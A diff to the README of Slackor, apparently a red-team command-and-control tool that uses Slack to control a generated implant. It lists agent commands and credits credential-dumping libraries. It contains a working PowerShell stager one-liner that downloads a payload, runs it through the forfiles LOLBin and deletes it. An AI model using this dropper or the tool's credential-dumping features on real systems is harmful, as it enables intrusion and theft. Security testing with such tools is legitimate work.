@@ -28,7 +28,7 @@ This repo contains five files:
 - ```install.sh``` Installs dependancies
 - ```setup.py``` The script to create the slack channels, database, and implant
 - ```server.py``` The Slackor server, designed to be ran on Linux
-- ```template.go``` Template for the generated implant
+- ```agent.go``` The generated implant
 - ```requirements.txt``` Python dependencies (installed automatically)
 
 To get started:
@@ -45,7 +45,7 @@ Run the "stager" module to generate a one-liner and other droppers.
  ```
  powershell.exe iwr [URL] -o C:\Users\Public\[NAME].exe; forfiles.exe /p c:\windows\system32 /m svchost.exe /c C:\Users\Public\[NAME]; timeout 2; del C:\Users\Public\[NAME].exe
  ```
- This will execute InvokeWebRequest(PS v.3+) to download the payload, execute it using a [LOLBin](https://github.com/LOLBAS-Project/LOLBAS/blob/master/OSBinaries/Forfiles.exe.md), and then delete itself once killed.  This is a working example but the command can tweaked to use another download method or execution method.   
+ This will execute InvokeWebRequest(PS v.3+) to download the payload, execute it using a [LOLBin](https://lolbas-project.github.io/lolbas/Binaries/Forfiles/), and then delete itself once killed.  This is a working example but the command can tweaked to use another download method or execution method.   
 
 Usage 
 =====
@@ -100,6 +100,8 @@ Here are several OPSEC safe commands that will NOT execute cmd.exe:
 
 - **cat** - prints file content
 - **cd** - change directory
+- **find** - search directory filenames 
+- **getip** - Get external IP address (makes a DNS request)
 - **hostname** - Displays the name of the host
 - **ifconfig** - Displays interface information
 - **ls** - list directory contents
@@ -125,6 +127,7 @@ Credits
 - Countless threads on StackOverflow
 - Thanks to [impacket](https://github.com/SecureAuthCorp/impacket) for dumping hashes from SAM/SYS/SECURITY reg hives. 
 - LSASS dump credential extraction made possbile using [pypykatz](https://github.com/skelsec/pypykatz) by skelsec
+- Bob Aman ([Sporkmonger](https://github.com/sporkmonger)) for various additions
 
 Future goals 
 =====
